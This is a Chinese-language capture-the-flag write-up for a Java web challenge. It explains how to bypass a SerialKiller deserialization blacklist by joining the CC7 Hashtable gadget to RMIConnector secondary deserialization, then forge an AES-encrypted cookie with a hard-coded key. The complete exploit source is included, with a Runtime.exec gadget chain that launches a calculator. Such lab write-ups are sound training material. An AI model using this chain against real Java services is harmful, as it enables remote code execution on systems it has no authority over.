# 解题思路

通过 jd-gui 等工具反编译 war 包可知，在 `/check` 路由下存在对 Cookie 的反序列化操作，类似于 Shiro，给 Cookie 加了一层 AES 加密，但是密钥等信息是硬编码的。

同时在 `lib` 目录下可以看见存在 CC3.2.1 的依赖，但是是使用 `SerialKiller` 进行的反序列化，通过黑名单基本上将 CC 链都过滤的差不多了，只剩下一个 CC7 的 `Hashtable` 没有过滤，但是这里也只能存在 CC7 的后半段。

对于黑名单过滤的反序列化，一般只有两条思路，要么找到一条全新的链，要么通过二次反序列化去打，这里的二次反序列化是指那些会对 payload 进行如 Base64 编码处理的二次反序列化，但是这里常用的 `SignedObject` 等都被 ban 了，只剩下一个 `RMIConnector` 能够使用，那么接下来的问题就是如何将 CC7 和 RMIComnnector 拼接在一起。

如果之前了解过 RMIConnector 的二次反序列化应该知道，核心点在于调用其 `connect` 方法，这个方法会对其构造参数中的 `JMXServiceURL` 对象的 url 后段进行 Base64 解码后反序列化处理，那么我们如何调用这个方法呢，其实可以看到 `SerialKiller` 并没有 ban 掉 `InvokerTransformer`，所有我们只要能够将 HashTable 链接上 InvokerTransformer 就可以调用其 `connect` 方法了。

但是这里如何连接上是一个难点，如果熟悉 CC7 的话一个清楚其关键在于两个 LazyMap 的 hashcode 必须相等，同时由于这里是调用的 `InvokerTransformer` 的 transform 方法，要求参数必须为 RMIConnector 对象才能成功利用，那么这里我们通过查看源码可知 `LazyMap#hashCode` 的计算方法是分别计算键值的 hashCode 后进行异或得到的，那么这里利用异或的性质，我们将键值设置为相同的值即可通过 hashCode 的判断，同时对于参数的控制我们将 RMIConnector 对象放在第一个 LazyMap 中即可。(需要对CC7这个链子熟悉并且会调试)


`exp.java`:
```java
package com.ctf.ezjava;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.*;

public class exp {
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    public static String getPayload(byte[] p) throws Exception {
        String encode = Base64.getEncoder().encodeToString(p);
        InvokerTransformer invokerTransformer = new InvokerTransformer(null, null, null);

        String url = "service:jmx:rmi:///stub/" + encode;
        JMXServiceURL jmxServiceURL = new JMXServiceURL(url);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, new HashMap<>());

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazymap1 = LazyMap.decorate(innerMap1, invokerTransformer);
        lazymap1.put(rmiConnector, rmiConnector);
        Map lazymap2 = LazyMap.decorate(innerMap2, invokerTransformer);
        lazymap2.put(0, 0);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazymap1, 1);
        hashtable.put(lazymap2, 1);

        setFieldValue(invokerTransformer, "iMethodName", "connect");
        setFieldValue(invokerTransformer, "iParamTypes", null);
        setFieldValue(invokerTransformer, "iArgs", null);

        lazymap1.remove(0);

        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();
        return Base64.getEncoder().encodeToString(bao.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"open -a Calculator"})
        };
        Transformer transformerChain = new ChainedTransformer(faketransformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tem = new TiedMapEntry(lazyMap, "foo");
        Map expMap = new HashMap();
        expMap.put(tem, "bar");

        lazyMap.remove("foo");

        setFieldValue(transformerChain, "iTransformers", transformers);

        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(expMap);
        oos.flush();
        oos.close();

        String payload = getPayload(bao.toByteArray());
        byte[] key = Base64.getDecoder().decode("bGluZ2xpbmdsaW5nbGluZw==");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
        try {
            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
        } catch (Exception e) {
            e.printStackTrace();
        }
        byte[] encrypted = cipher.doFinal(payload.getBytes());
        String cookie = Base64.getEncoder().encodeToString(encrypted);
        System.out.println(cookie);
        System.out.println(cookie.length());
    }
}
```
